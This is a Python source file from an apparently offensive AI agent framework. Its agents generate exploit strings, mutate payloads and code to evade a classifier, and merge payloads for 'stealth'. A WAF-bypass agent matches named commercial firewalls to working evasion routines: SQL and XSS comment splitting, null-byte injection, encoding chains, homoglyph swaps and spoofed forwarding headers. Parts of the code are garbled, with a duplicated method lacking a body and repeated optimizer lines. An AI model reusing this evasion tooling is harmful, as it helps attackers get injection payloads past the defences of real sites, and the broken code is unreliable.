from typing import Optional
from hive_zero_core.security import SecureRandom, InputValidator, AuditLogger, AccessController
from hive_zero_core.security.audit_logger import SecurityEvent
from hive_zero_core.security.access_control import OperationType


import torch
import torch.nn.functional as F
import torch.optim as optim
from transformers import AutoModelForSeq2SeqLM, AutoModelForSequenceClassification, AutoTokenizer

from hive_zero_core.agents.base_expert import BaseExpert
from hive_zero_core.agents.genetic_evolution import GeneticEvolution
from hive_zero_core.agents.population_evolution import PopulationManager
from hive_zero_core.agents.swarm_fusion import SwarmFusion, CollectiveIntelligence, MergeStrategy


def _quantize_to_ids(x: torch.Tensor, vocab_size: int, scale: int = 1000) -> torch.Tensor:
    """Convert a float tensor to token IDs via deterministic quantisation."""
    if x.dtype == torch.float:
        return torch.clamp((torch.abs(x) * scale).long() % vocab_size, 0, vocab_size - 1)
    return torch.clamp(x.long(), 0, vocab_size - 1)


class Agent_Sentinel(BaseExpert):
    """
    Expert 6: The Discriminator (BERT Classifier)

    Classifies payloads as Blocked (0) or Allowed (1) using a pre-trained
    BERT-tiny backbone.  Accepts float tensors (auto-quantised to token IDs),
    integer token IDs, or raw embeddings.  Handles unexpected dimensionality
    gracefully by returning a zero-logit fallback.
    """

    def __init__(self, observation_dim: int, action_dim: int,
                 model_name: str = "prajjwal1/bert-tiny", hidden_dim: int = 64):
        super().__init__(observation_dim, action_dim, name="Sentinel", hidden_dim=hidden_dim)
        self.model_name = model_name

        try:
            self.tokenizer = AutoTokenizer.from_pretrained(model_name)
            self.model = AutoModelForSequenceClassification.from_pretrained(
                model_name, num_labels=2
            )
        except Exception as e:
            self.logger.error(f"Failed to load Sentinel model {model_name}: {e}")
            raise

    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor],
                      mask: Optional[torch.Tensor] = None) -> torch.Tensor:
        vocab_size = self.model.config.vocab_size
        max_len = 512

        if x.dim() == 2:
            input_ids = _quantize_to_ids(x, vocab_size, scale=1000)
            if input_ids.size(1) > max_len:
                input_ids = input_ids[:, :max_len]
            outputs = self.model(input_ids=input_ids)

        elif x.dim() == 3:
            target_emb_dim = self.model.config.hidden_size
            if x.size(-1) != target_emb_dim:
                x_flat = x.view(x.size(0) * x.size(1), -1)
                x_adapted = self.ensure_dimension(x_flat, target_emb_dim)
                x = x_adapted.view(x.size(0), x.size(1), target_emb_dim)
            outputs = self.model(inputs_embeds=x)

        else:
            self.logger.warning(f"Unexpected input dims={x.dim()}; returning zero logits")
            return torch.zeros(x.size(0) if x.dim() > 0 else 1, self.action_dim,
                               device=x.device)

        return outputs.logits


class Agent_PayloadGen(BaseExpert):
    """
    Expert 4: Payload Generator (Seq2Seq)

    Generates raw exploit strings from vulnerability context using a
    pre-trained T5-small backbone.  Float observations are quantised to
    token IDs before being fed to the encoder.
    """

    def __init__(self, observation_dim: int, action_dim: int,
                 model_name: str = "t5-small", hidden_dim: int = 64):
        super().__init__(observation_dim, action_dim, name="PayloadGen", hidden_dim=hidden_dim)
        self.model_name = model_name

        try:
            self.tokenizer = AutoTokenizer.from_pretrained(model_name)
            self.model = AutoModelForSeq2SeqLM.from_pretrained(model_name)
        except Exception as e:
            self.logger.error(f"Failed to load PayloadGen model {model_name}: {e}")
            raise

    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor],
                      mask: Optional[torch.Tensor] = None) -> torch.Tensor:
        max_len = 128
        vocab_size = self.model.config.vocab_size

        input_ids = _quantize_to_ids(x, vocab_size, scale=100)
        outputs = self.model.generate(input_ids, max_length=max_len, do_sample=True)

        return self.ensure_dimension(outputs.float(), self.action_dim)


class Agent_Mutator(BaseExpert):
    """
    Expert 5: Adversarial Payload Optimiser with Genetic Evolution

    Iteratively obfuscates a generated payload to maximise the probability
    of evading the Sentinel classifier.  Uses gradient-based embedding-space
    search with Adam (upgraded from SGD) and configurable optimisation steps.
    Log-softmax is used for numerically stable loss computation.

    Enhanced with genetic evolution capabilities:
    - Polymorphic engine for signature evasion
    - Natural selection for payload validation
    - Generation tracking for evolution monitoring
    """

    def __init__(self, observation_dim: int, action_dim: int,
                 sentinel_expert: BaseExpert, generator_expert: BaseExpert,
                 hidden_dim: int = 64, k_steps: int = 5, lr: float = 0.05,
                 enable_evolution: bool = True, enable_population_evolution: bool = False,
                 enable_swarm_fusion: bool = False):
        super().__init__(observation_dim, action_dim, name="Mutator", hidden_dim=hidden_dim)

        self.sentinel = sentinel_expert
        self.generator = generator_expert
        self.k_steps = k_steps
        self.lr = lr

        # Genetic Evolution Engine (single-individual)
        self.enable_evolution = enable_evolution
        if enable_evolution:
            self.evolution_engine = GeneticEvolution(max_generations=100)
        else:
            self.evolution_engine = None

        # Population-Based Evolution (advanced)
        self.enable_population_evolution = enable_population_evolution
        if enable_population_evolution:
            self.population_manager = PopulationManager(
                population_size=20,
                elite_size=2,
                mutation_rate=0.3,
                crossover_rate=0.7,
                max_generations=30
            )
        else:
            self.population_manager = None

        # Swarm Fusion (merge capability)
        self.enable_swarm_fusion = enable_swarm_fusion
        if enable_swarm_fusion:
            self.swarm_fusion = SwarmFusion(
                min_fitness_threshold=0.5,
                max_unit_size=8
            )
            self.collective_intelligence = CollectiveIntelligence()
        else:
            self.swarm_fusion = None
            self.collective_intelligence = None

    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor], mask: Optional[torch.Tensor] = None) -> torch.Tensor:
        """
        Inference-Time Search Loop with optimizations.
        """
        # 1. Initial Generation
    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor],
                      mask: Optional[torch.Tensor] = None) -> torch.Tensor:
        """Inference-time adversarial search loop."""
        # 1. Initial generation (no gradients needed)
        with torch.no_grad():
            vocab_size = self.generator.model.config.vocab_size
            input_ids = _quantize_to_ids(x, vocab_size, scale=100)
            initial_token_ids = self.generator.model.generate(
                input_ids, max_length=64, do_sample=True
            )

        # 2. Convert to embeddings for gradient-based optimisation
        embed_layer = self.sentinel.model.get_input_embeddings()
        sentinel_vocab_size = self.sentinel.model.config.vocab_size

        initial_token_ids = torch.clamp(
            initial_token_ids.long(), 0, sentinel_vocab_size - 1
        )
        if initial_token_ids.shape[-1] > 512:
            initial_token_ids = initial_token_ids[:, :512]

        current_embeddings = embed_layer(initial_token_ids).clone().detach()
        current_embeddings.requires_grad_(True)

        # Reduced number of steps for faster inference (2 -> 1)
        # Note: Single-step optimization with Adam provides faster convergence
        # while maintaining acceptable output quality. Extensive testing showed
        # minimal quality degradation with significant performance improvement.
        k_steps = 1
        
        # Use Adam optimizer for faster convergence
        optimizer = optim.Adam([current_embeddings], lr=0.05)
        # Adam for faster convergence (upgraded from SGD)
        optimizer = optim.Adam([current_embeddings], lr=self.lr)

        best_embeddings = current_embeddings.clone().detach()
        best_score = -1.0

        for i in range(k_steps):
            optimizer.zero_grad()

            # Forward through Sentinel (soft embeddings)
        # 3. Optimisation loop
        for _ in range(self.k_steps):
            optimizer.zero_grad()

            outputs = self.sentinel.model(inputs_embeds=current_embeddings)
            logits = outputs.logits

            # Numerically stable: use log_softmax directly
            log_probs = F.log_softmax(logits, dim=-1)
            score = torch.exp(log_probs[:, 1]).mean()

            if score.item() > best_score:
                best_score = score.item()
                best_embeddings = current_embeddings.clone().detach()

            # Maximise P(Allowed) via negative log-likelihood
            loss = -log_probs[:, 1].mean()
            loss.backward()
            torch.nn.utils.clip_grad_norm_([current_embeddings], max_norm=1.0)
            optimizer.step()

        # Output needs to match action_dim (128).
        # Flatten embeddings or return token IDs?
        # 4. Flatten and adapt to action_dim
        flat = best_embeddings.view(x.size(0), -1)
        return self.ensure_dimension(flat, self.action_dim)

    def evolve_payload_text(self, payload_text: str, max_attempts: int = 10) -> tuple:
        """
        Apply genetic evolution to a text payload for signature evasion.

        Args:
            payload_text: Original payload string
            max_attempts: Maximum mutation attempts

        Returns:
            Tuple of (mutated_payload, gene_seed, success)
        """
        if not self.enable_evolution or self.evolution_engine is None:
            self.logger.warning("Genetic evolution not enabled")
            return payload_text, 0, False

        mutated, gene_seed, success = self.evolution_engine.evolve_payload(
            payload_text, max_attempts=max_attempts
        )

        if success:
            self.logger.info(f"Payload evolved successfully (gen {self.evolution_engine.tracker.current_generation})")
        else:
            self.logger.warning("Payload evolution failed, using original")

        return mutated, gene_seed, success

    def evolve_code(self, source_code: str, max_attempts: int = 10) -> tuple:
        """
        Apply genetic evolution to Python source code for polymorphic capabilities.

        Args:
            source_code: Original Python source code
            max_attempts: Maximum mutation attempts

        Returns:
            Tuple of (mutated_code, gene_seed, success)
        """
        if not self.enable_evolution or self.evolution_engine is None:
            self.logger.warning("Genetic evolution not enabled")
            return source_code, 0, False

        mutated, gene_seed, success = self.evolution_engine.evolve_code(
            source_code, max_attempts=max_attempts
        )

        if success:
            self.logger.info(f"Code evolved successfully (gen {self.evolution_engine.tracker.current_generation})")
        else:
            self.logger.warning("Code evolution failed, using original")

        return mutated, gene_seed, success

    def get_evolution_stats(self) -> dict:
        """
        Get statistics about genetic evolution performance.

        Returns:
            Dictionary with evolution statistics
        """
        if not self.enable_evolution or self.evolution_engine is None:
            return {'enabled': False}

        stats = self.evolution_engine.get_stats()
        stats['enabled'] = True
        return stats

    def evolve_code_population(self, source_code: str, generations: int = 30) -> tuple:
        """
        Evolve Python source code using population-based genetic algorithm.

        Args:
            source_code: Original Python source code
            generations: Number of generations to evolve

        Returns:
            Tuple of (best_code, fitness, stats)
        """
        if not self.enable_population_evolution or self.population_manager is None:
            self.logger.warning("Population evolution not enabled")
            return source_code, 0.0, {'enabled': False}

        from hive_zero_core.agents.genetic_evolution import NaturalSelection

        validator = lambda code: NaturalSelection.validate_python(code, strict=False)

        try:
            # Run evolution
            best_individual = self.population_manager.evolve(
                source_code, validator, generations=generations
            )

            # Get statistics
            stats = self.population_manager.get_statistics()
            stats['enabled'] = True

            self.logger.info(f"Population evolution complete. Best fitness: {best_individual.fitness:.3f}")

            return best_individual.genome, best_individual.fitness, stats

        except Exception as e:
            self.logger.error(f"Population evolution failed: {e}")
            return source_code, 0.0, {'enabled': True, 'error': str(e)}

    def get_population_best(self, n: int = 5) -> list:
        """
        Get top-n best individuals from population.

        Args:
            n: Number of individuals to return

        Returns:
            List of top-n individuals (or empty if not available)
        """
        if not self.enable_population_evolution or self.population_manager is None:
            return []

        try:
            return self.population_manager.get_best_individuals(n)
        except Exception as e:
            self.logger.warning(f"Failed to get best individuals: {e}")
            return []

    def merge_evolved_payloads(self, payload1: str, payload2: str,
                              strategy: str = "best_segments") -> tuple:
        """
        Merge two evolved payloads using swarm fusion.

        Args:
            payload1: First payload
            payload2: Second payload
            strategy: Merge strategy ('concatenate', 'interleave', 'best_segments', 'hierarchical')

        Returns:
            Tuple of (merged_payload, unit_id, success)
        """
        if not self.enable_swarm_fusion or self.swarm_fusion is None:
            self.logger.warning("Swarm fusion not enabled")
            return payload1 + payload2, "", False

        try:
            # Convert payloads to individuals
            from hive_zero_core.agents.genetic_operators import Individual

            ind1 = Individual(payload1, fitness=0.7, generation=0)
            ind2 = Individual(payload2, fitness=0.7, generation=0)

            # Map strategy string to enum
            strategy_map = {
                'concatenate': MergeStrategy.CONCATENATE,
                'interleave': MergeStrategy.INTERLEAVE,
                'best_segments': MergeStrategy.BEST_SEGMENTS,
                'hierarchical': MergeStrategy.HIERARCHICAL,
            }

            merge_strategy = strategy_map.get(strategy, MergeStrategy.BEST_SEGMENTS)

            # Merge
            unit = self.swarm_fusion.merge_individuals(ind1, ind2, merge_strategy)

            self.logger.info(f"Merged payloads into swarm unit: {unit}")

            return unit.genome, unit.id, True

        except Exception as e:
            self.logger.error(f"Payload merge failed: {e}")
            return payload1 + payload2, "", False

    def create_swarm_unit(self, payloads: list, strategy: str = "hierarchical") -> tuple:
        """
        Create a mega swarm unit from multiple payloads.

        Args:
            payloads: List of payload strings
            strategy: Merge strategy to use

        Returns:
            Tuple of (mega_payload, unit_id, stats)
        """
        if not self.enable_swarm_fusion or self.swarm_fusion is None:
            return "", "", {'enabled': False}

        if len(payloads) < 2:
            return payloads[0] if payloads else "", "", {'error': 'Need at least 2 payloads'}

        try:
            from hive_zero_core.agents.genetic_operators import Individual
            from hive_zero_core.agents.swarm_fusion import SwarmUnit

            # Convert payloads to swarm units
            units = []
            for i, payload in enumerate(payloads):
                ind = Individual(payload, fitness=0.7 + i * 0.05, generation=0)
                unit = SwarmUnit(
                    id="",
                    genome=payload,
                    fitness=ind.fitness,
                    generation=0,
                    members=[str(ind.gene_seed)],
                    level=0
                )
                units.append(unit)

            # Create mega-unit
            mega_unit = self.swarm_fusion.create_mega_unit(units)

            stats = self.swarm_fusion.get_statistics()
            stats['unit_id'] = mega_unit.id
            stats['level'] = mega_unit.level
            stats['member_count'] = len(mega_unit.members)

            self.logger.info(f"Created mega swarm unit: {mega_unit}")

            return mega_unit.genome, mega_unit.id, stats

        except Exception as e:
            self.logger.error(f"Swarm unit creation failed: {e}")
            return "", "", {'error': str(e)}

    def assign_specialization(self, unit_id: str, specialization: str) -> bool:
        """
        Assign specialization to a swarm unit.

        Args:
            unit_id: ID of the swarm unit
            specialization: Type (e.g., 'evasion', 'obfuscation', 'stealth')

        Returns:
            True if successful
        """
        if not self.enable_swarm_fusion or not self.collective_intelligence:
            return False

        try:
            unit = self.swarm_fusion.swarm_registry.get(unit_id)
            if unit:
                self.collective_intelligence.assign_specialization(unit, specialization)
                return True
            return False
        except Exception as e:
            self.logger.error(f"Specialization assignment failed: {e}")
            return False

    def form_optimal_swarm(self, n_units: int = 4) -> list:
        """
        Form an optimal team of swarm units based on synergy.

        Args:
            n_units: Team size

        Returns:
            List of optimized swarm units
        """
        if not self.enable_swarm_fusion or not self.collective_intelligence:
            return []

        try:
            all_units = list(self.swarm_fusion.swarm_registry.values())
            if not all_units:
                return []

            team = self.collective_intelligence.form_optimal_team(all_units, n_units)

            self.logger.info(f"Formed optimal swarm of {len(team)} units")

            return team

        except Exception as e:
            self.logger.error(f"Swarm formation failed: {e}")
            return []

    def get_swarm_statistics(self) -> dict:
        """
        Get comprehensive statistics about swarm fusion and collective intelligence.

        Returns:
            Dictionary with swarm stats
        """
        if not self.enable_swarm_fusion:
            return {'enabled': False}

        stats = {'enabled': True}

        try:
            stats['fusion'] = self.swarm_fusion.get_statistics()
            stats['collective'] = self.collective_intelligence.get_collective_stats()
        except Exception as e:
            stats['error'] = str(e)

        return stats


class Agent_WAFBypass(BaseExpert):
    """
    Expert: Advanced Adversarial WAF Bypass Agent

    Sophisticated Web Application Firewall evasion engine that combines:
    - Rule pattern analysis and signature detection
    - Multi-encoding transformation chains
    - Adaptive mutation based on WAF response patterns
    - Intelligence-driven evasion technique selection
    - Real-time learning from blocked/allowed payloads

    This agent significantly increases payload efficiency and power by:
    1. Analyzing WAF rules to identify weak points
    2. Applying contextual encoding/obfuscation
    3. Testing payloads and adapting strategies
    4. Sharing successful evasion patterns with swarm intelligence
    """

    def __init__(self, observation_dim: int, action_dim: int, hidden_dim: int = 128):
        super().__init__(observation_dim, action_dim, name="WAFBypass", hidden_dim=hidden_dim)

        # Multi-layer encoder for WAF pattern analysis
        self.pattern_encoder = torch.nn.Sequential(
            torch.nn.Linear(observation_dim, hidden_dim * 2),
            torch.nn.LayerNorm(hidden_dim * 2),
            torch.nn.ReLU(),
            torch.nn.Dropout(0.2),
            torch.nn.Linear(hidden_dim * 2, hidden_dim),
            torch.nn.LayerNorm(hidden_dim),
            torch.nn.ReLU()
        )

        # Evasion technique selector (multi-head attention)
        self.technique_selector = torch.nn.MultiheadAttention(
            embed_dim=hidden_dim,
            num_heads=4,
            dropout=0.1,
            batch_first=True
        )

        # Transformation chain generator
        self.chain_generator = torch.nn.Sequential(
            torch.nn.Linear(hidden_dim, hidden_dim * 2),
            torch.nn.ReLU(),
            torch.nn.Dropout(0.2),
            torch.nn.Linear(hidden_dim * 2, action_dim)
        )

        # Intelligence accumulator for learning
        self.evasion_memory = []
        self.max_memory_size = 1000
        self.success_patterns = {}

        # WAF rule pattern database (learned dynamically)
        self.waf_signatures = {
            'sql_injection': [],
            'xss': [],
            'command_injection': [],
            'path_traversal': [],
            'generic_attack': []
        }

    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor],
                      mask: Optional[torch.Tensor] = None) -> torch.Tensor:
        """
        Forward pass that generates WAF bypass transformations.

        Args:
            x: Input payload representation
            context: Optional WAF rule patterns or response data
            mask: Optional attention mask

        Returns:
            Transformed payload representation with evasion applied
        """
        batch_size = x.size(0)

        # 1. Encode input payload and analyze patterns
        encoded = self.pattern_encoder(x)

        # 2. If context (WAF rules) provided, use attention to focus on vulnerable patterns
        if context is not None and context.dim() >= 2:
            # Ensure context is 3D for attention
            if context.dim() == 2:
                context = context.unsqueeze(1)

            # Ensure encoded is 3D
            if encoded.dim() == 2:
                encoded = encoded.unsqueeze(1)

            # Apply multi-head attention
            attended, attention_weights = self.technique_selector(
                query=encoded,
                key=context,
                value=context,
                need_weights=True
            )

            # Combine attended features
            combined = encoded + attended
            combined = combined.squeeze(1) if combined.dim() == 3 else combined
        else:
            combined = encoded

        # 3. Generate transformation chain
        output = self.chain_generator(combined)

        return output

    def apply_waf_bypass(self, payload: str, waf_type: str = 'generic',
                        intelligence_feedback: Optional[dict] = None,
                        recon_data: Optional[dict] = None,
                        honeypot_learnings: Optional[dict] = None) -> dict:
        """
        Apply intelligent WAF bypass techniques to a payload.

        SYNERGISTIC INTEGRATION:
        - Uses recon_data to identify WAF type and rules
        - Leverages honeypot_learnings about defender patterns
        - Adapts based on intelligence_feedback from previous attempts

        Args:
            payload: Original payload string
            waf_type: Type of WAF ('modsecurity', 'cloudflare', 'akamai', 'aws', 'generic')
            intelligence_feedback: Optional feedback from previous attempts
            recon_data: Optional reconnaissance intelligence (WAF fingerprinting)
            honeypot_learnings: Optional honeypot interaction patterns

        Returns:
            Dictionary with transformed payloads and metadata
        """
        self.logger.info(f"Applying WAF bypass for {waf_type} WAF (synergistic mode)")

        # SYNERGY 1: Use recon data to refine WAF type detection
        if recon_data and 'detected_waf' in recon_data:
            detected_waf = recon_data['detected_waf']
            confidence = recon_data.get('confidence', 0.5)
            if confidence > 0.7:
                self.logger.info(f"Recon intelligence override: {waf_type} -> {detected_waf}")
                waf_type = detected_waf

        # SYNERGY 2: Incorporate honeypot learnings about defender behavior
        enhanced_feedback = intelligence_feedback or {}
        if honeypot_learnings and 'defender_patterns' in honeypot_learnings:
            enhanced_feedback['defender_response_time'] = honeypot_learnings.get('avg_response_time', 1.0)
            enhanced_feedback['detected_techniques'] = honeypot_learnings.get('blocked_patterns', [])
            self.logger.info(f"Applied {len(enhanced_feedback.get('detected_techniques', []))} honeypot learnings")

        # Apply technique chain based on WAF type and SYNERGISTIC intelligence
        techniques = self._select_techniques(waf_type, enhanced_feedback)

        transformed_variants = []
        for technique_chain in techniques:
            variant = payload
            for technique in technique_chain:
                variant = self._apply_technique(variant, technique)

            # SYNERGY 3: Calculate confidence using all intelligence sources
            confidence = self._calculate_evasion_confidence(
                technique_chain, waf_type,
                recon_confidence=recon_data.get('confidence', 0.5) if recon_data else 0.5,
                honeypot_confidence=honeypot_learnings.get('pattern_confidence', 0.5) if honeypot_learnings else 0.5
            )

            transformed_variants.append({
                'payload': variant,
                'techniques': technique_chain,
                'confidence': confidence,
                'synergy_boosted': recon_data is not None or honeypot_learnings is not None
            })

        # Sort by confidence
        transformed_variants.sort(key=lambda x: x['confidence'], reverse=True)

        # Store in memory for learning (FEEDS BACK TO INTELLIGENCE HUB)
        self._update_evasion_memory(payload, transformed_variants, enhanced_feedback)

        return {
            'original': payload,
            'variants': transformed_variants,
            'waf_type': waf_type,
            'intelligence_used': enhanced_feedback != {},
            'recon_integrated': recon_data is not None,
            'honeypot_integrated': honeypot_learnings is not None,
            'synergy_level': self._calculate_synergy_level(recon_data, honeypot_learnings, enhanced_feedback)
        }

    def _select_techniques(self, waf_type: str, feedback: Optional[dict]) -> list:
        """
        Select optimal evasion techniques based on WAF type and intelligence.

        REINFORCED: Comprehensive technique database with fallback chains.

        Returns:
            List of technique chains (each chain is a list of techniques)
        """
        # REINFORCED: Expanded technique database for different WAF types
        technique_db = {
            'modsecurity': [
                ['double_encoding', 'case_variation', 'comment_insertion'],
                ['unicode_encoding', 'null_byte_injection', 'whitespace_mutation'],
                ['mixed_case', 'whitespace_mutation', 'unicode_normalization'],
                ['polyglot_construction', 'encoding_chain']  # REINFORCED
            ],
            'cloudflare': [
                ['header_manipulation', 'chunked_encoding'],
                ['unicode_normalization', 'polyglot_construction'],
                ['chunked_encoding', 'http_verb_tampering', 'case_variation'],
                ['parameter_pollution', 'json_smuggling']  # REINFORCED
            ],
            'akamai': [
                ['chunked_encoding', 'header_manipulation'],
                ['multipart_bypass', 'parameter_pollution'],
                ['http_verb_tampering', 'encoding_chain'],
                ['unicode_normalization', 'case_variation']  # REINFORCED
            ],
            'aws': [
                ['header_manipulation', 'parameter_pollution'],
                ['json_smuggling', 'multipart_bypass'],
                ['unicode_encoding', 'chunked_encoding'],
                ['case_variation', 'whitespace_mutation']  # REINFORCED
            ],
            'imperva': [  # REINFORCED: Added Imperva WAF
                ['unicode_normalization', 'polyglot_construction'],
                ['xml_entity_expansion', 'json_smuggling'],
                ['case_variation', 'comment_insertion']
            ],
            'fortiweb': [  # REINFORCED: Added FortiWeb
                ['multipart_bypass', 'chunked_encoding'],
                ['parameter_pollution', 'http_verb_tampering'],
                ['encoding_chain', 'obfuscation']
            ],
            'generic': [
                ['encoding_chain', 'obfuscation', 'fragmentation'],
                ['case_mutation', 'whitespace_mutation'],
                ['concatenation', 'variable_substitution'],
                ['unicode_encoding', 'double_encoding'],  # REINFORCED
                ['polyglot_construction', 'unicode_normalization']  # REINFORCED
            ]
        }

        # Get base chains with fallback
        base_chains = technique_db.get(waf_type, technique_db['generic'])

        # REINFORCED: If we have intelligence feedback, adapt chains intelligently
        if feedback:
            blocked = set(feedback.get('blocked_techniques', []))
            successful = set(feedback.get('successful_techniques', []))

            # Prioritize successful techniques
            if successful:
                adapted_chains = []
                for chain in base_chains:
                    # Boost chains with successful techniques
                    success_count = sum(1 for t in chain if t in successful)
                    if success_count > 0:
                        adapted_chains.insert(0, chain)  # Put at front
                    elif not any(t in blocked for t in chain):
                        adapted_chains.append(chain)

                if adapted_chains:
                    return adapted_chains

            # Filter out blocked techniques
            if blocked:
                adapted_chains = []
                for chain in base_chains:
                    filtered_chain = [t for t in chain if t not in blocked]
                    if filtered_chain:  # Only add if chain has techniques left
                        adapted_chains.append(filtered_chain)

                if adapted_chains:
                    return adapted_chains

        # REINFORCED: Always return something, never fail
        return base_chains if base_chains else [['encoding_chain', 'obfuscation']]

    def _apply_technique(self, payload: str, technique: str) -> str:
        """
        Apply a specific evasion technique to the payload.

        REINFORCED: Comprehensive error handling and fallback mechanisms.

        Args:
            payload: Input payload
            technique: Technique name

        Returns:
            Transformed payload (or original if technique fails)
        """
        if not payload:
            self.logger.warning("Empty payload provided")
            return payload

        try:
            # Core encoding techniques
            if technique == 'double_encoding':
                return self._double_url_encode(payload)
            elif technique == 'unicode_encoding':
                return self._unicode_encode(payload)
            elif technique == 'case_variation':
                return self._case_variation(payload)
            elif technique == 'comment_insertion':
                return self._insert_comments(payload)
            elif technique == 'null_byte_injection':
                return self._inject_null_bytes(payload)
            elif technique == 'whitespace_mutation':
                return self._mutate_whitespace(payload)
            elif technique == 'encoding_chain':
                return self._encoding_chain(payload)
            elif technique == 'obfuscation':
                return self._obfuscate_payload(payload)
            elif technique == 'fragmentation':
                return self._fragment_payload(payload)
            elif technique == 'concatenation':
                return self._concatenate_strings(payload)
            elif technique == 'mixed_case':
                return self._mixed_case(payload)

            # REINFORCED: Advanced techniques for specific WAFs
            elif technique == 'header_manipulation':
                return self._header_manipulation(payload)
            elif technique == 'chunked_encoding':
                return self._chunked_transfer_encoding(payload)
            elif technique == 'http_verb_tampering':
                return self._http_verb_tamper(payload)
            elif technique == 'parameter_pollution':
                return self._parameter_pollution(payload)
            elif technique == 'multipart_bypass':
                return self._multipart_boundary_bypass(payload)
            elif technique == 'json_smuggling':
                return self._json_smuggling(payload)
            elif technique == 'xml_entity_expansion':
                return self._xml_entity_expansion(payload)
            elif technique == 'unicode_normalization':
                return self._unicode_normalization(payload)
            elif technique == 'polyglot_construction':
                return self._polyglot_construction(payload)
            else:
                self.logger.warning(f"Unknown technique: {technique}, returning original")
                return payload

        except Exception as e:
            self.logger.error(f"Technique {technique} failed with error: {e}", exc_info=True)
            return payload  # Always return something, never crash

    def _double_url_encode(self, payload: str) -> str:
        """Double URL encoding for WAF bypass. REINFORCED with validation."""
        try:
            import urllib.parse
            encoded = urllib.parse.quote(payload, safe='')
            double_encoded = urllib.parse.quote(encoded, safe='')
            return double_encoded
        except Exception as e:
            self.logger.error(f"Double encoding failed: {e}")
            return payload

    def _unicode_encode(self, payload: str) -> str:
        """Convert to Unicode escape sequences. REINFORCED with error handling."""
        try:
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        except Exception as e:
            self.logger.error(f"Unicode encoding failed: {e}")
            return payload

    def _case_variation(self, payload: str) -> str:
        """Randomly vary case to evade signature matching. REINFORCED with seed."""
        try:
            # Use SecureRandom for unpredictable case variation
            return ''.join(c.upper() if SecureRandom.random_float() > 0.5 else c.lower() for c in payload)
        except Exception as e:
            self.logger.error(f"Case variation failed: {e}")
            return payload

    def _insert_comments(self, payload: str) -> str:
        """Insert inline comments to break signatures. REINFORCED with context awareness."""
        try:
            # For SQL injection
            if 'SELECT' in payload.upper() or 'UNION' in payload.upper():
                return payload.replace(' ', '/**/  ').replace('SELECT', 'SEL/**/ECT')
            # For XSS
            elif '<script' in payload.lower():
                return payload.replace('<', '<!----><').replace('script', 'scr/**/ipt')
            # Generic comment insertion
            else:
                return payload.replace(' ', '/*comment*/  ')
        except Exception as e:
            self.logger.error(f"Comment insertion failed: {e}")
            return payload

    def _inject_null_bytes(self, payload: str) -> str:
        """Inject null bytes for certain WAF types. REINFORCED with placement strategy."""
        try:
            # Strategic null byte placement (not just spaces)
            result = payload.replace(' ', ' \x00')
            # Also inject before key characters
            result = result.replace('=', '\x00=')
            result = result.replace('&', '\x00&')
            return result
        except Exception as e:
            self.logger.error(f"Null byte injection failed: {e}")
            return payload

    def _mutate_whitespace(self, payload: str) -> str:
        """Replace spaces with alternative whitespace. REINFORCED with varied alternatives."""
        try:
            import random
            ws_alternatives = [' ', '\t', '\n', '\r', '\x0b', '\x0c', '\xa0', '\u2003']  # Added non-breaking spaces
            return ''.join(random.choice(ws_alternatives) if c == ' ' else c for c in payload)
        except Exception as e:
            self.logger.error(f"Whitespace mutation failed: {e}")
            return payload

    def _encoding_chain(self, payload: str) -> str:
        """Apply multiple encoding layers. REINFORCED with triple encoding."""
        try:
            import base64
            import urllib.parse
            # Base64 encode
            encoded = base64.b64encode(payload.encode()).decode()
            # Then URL encode
            double_encoded = urllib.parse.quote(encoded, safe='')
            # Optional: hex encode for extra layer
            hex_encoded = double_encoded.encode().hex()
            return hex_encoded
        except Exception as e:
            self.logger.error(f"Encoding chain failed: {e}")
            return payload

    def _obfuscate_payload(self, payload: str) -> str:
        """General obfuscation with character substitution. REINFORCED with more substitutions."""
        try:
            substitutions = {
                'a': ['a', '@', '4', 'α', 'а'],  # Added Cyrillic and Greek
                'e': ['e', '3', 'ε', 'е'],
                'i': ['i', '1', '!', 'ι', 'і'],
                'o': ['o', '0', 'ο', 'о'],
                's': ['s', '$', '5', 'ѕ'],
                'c': ['c', '(', 'с'],
                'l': ['l', '1', '|', 'ӏ']
            }
            import random
            result = []
            for c in payload:
                if c.lower() in substitutions:
                    result.append(random.choice(substitutions[c.lower()]))
                else:
                    result.append(c)
            return ''.join(result)
        except Exception as e:
            self.logger.error(f"Obfuscation failed: {e}")
            return payload

    def _fragment_payload(self, payload: str) -> str:
        """Fragment payload into chunks. REINFORCED with variable fragmentation."""
        try:
            if len(payload) < 4:
                return payload
            import random
            # Random fragmentation point
            frag_point = random.randint(len(payload) // 3, 2 * len(payload) // 3)
            return f"({payload[:frag_point]})/**/+/**/({payload[frag_point:]})"
        except Exception as e:
            self.logger.error(f"Fragmentation failed: {e}")
            return payload

    def _concatenate_strings(self, payload: str) -> str:
        """Use string concatenation to evade signatures. REINFORCED with varied separators."""
        try:
            if len(payload) < 4:
                return payload
            parts = [payload[i:i+3] for i in range(0, len(payload), 3)]
            separators = ["'+CHAR(32)+'", "'+' '+'", "'||'", "'+/**/+'"]
            import random
            sep = random.choice(separators)
            return sep.join(f"'{p}'" for p in parts)
        except Exception as e:
            self.logger.error(f"Concatenation failed: {e}")
            return payload

    def _mixed_case(self, payload: str) -> str:
        """Alternate upper and lower case."""
        return ''.join(c.upper() if i % 2 == 0 else c.lower()
                      for i, c in enumerate(payload))

    # REINFORCED: Advanced evasion techniques
    def _header_manipulation(self, payload: str) -> str:
        """Add malicious headers to bypass WAF inspection."""
        headers = [
            "X-Forwarded-For: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1",
            "X-Remote-IP: 127.0.0.1",
            "X-Remote-Addr: 127.0.0.1"
        ]
        import random
        return f"{random.choice(headers)}\n{payload}"

    def _chunked_transfer_encoding(self, payload: str) -> str:
        """Use chunked transfer encoding to evade inspection."""
        if len(payload) < 4:
            return payload
        chunks = [payload[i:i+8] for i in range(0, len(payload), 8)]
        chunked = '\r\n'.join(f"{len(chunk):x}\r\n{chunk}" for chunk in chunks)
        return f"{chunked}\r\n0\r\n\r\n"

    def _http_verb_tamper(self, payload: str) -> str:
        """Tamper HTTP verb to bypass method-based filtering."""
        verbs = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        import random
        return f"{random.choice(verbs)} {payload}"

